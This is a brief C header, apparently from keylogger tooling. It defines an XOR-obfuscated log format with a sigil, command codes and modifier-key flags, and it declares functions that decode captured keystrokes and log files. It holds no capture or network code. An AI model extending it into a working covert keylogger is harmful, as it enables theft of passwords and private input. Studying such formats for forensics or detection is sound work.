#ifndef __KEYLOGGER_H
#define __KEYLOGGER_H

#define KEYLOGGER_RV_NORMAL 1
#define KEYLOGGER_RV_SPEC 2

#define KEYLOGGER_TABLE_CTRL 0x4
#define KEYLOGGER_TABLE_SHIFT 0x5
#define KEYLOGGER_TABLE_CAPS_LOCK 0x6

#define KEYLOGGER_SIGIL_LEN 4
#define KEYLOGGER_SIGIL "\xF0\xE9\xF6\x66"

#define KEYLOGGER_CMD_XOR_KEY 0xB
#define KEYLOGGER_CMD_KEY 0x2 //[DATA|KEY]
#define KEYLOGGER_CMD_PRG 0xC //[CMD|LEN|DATA}
#define KEYLOGGER_CMD_TIME 0x5 //[CMD|TIME]

#define KEYLOGGER_IS_CTRL_ON(A) ((A >> 8) & 0xFF)

extern int keylogger_DecodeKey(unsigned short data, char* key, int keyLen);
extern int keylogger_DecodeFile(char* flog, char* fout);

#endif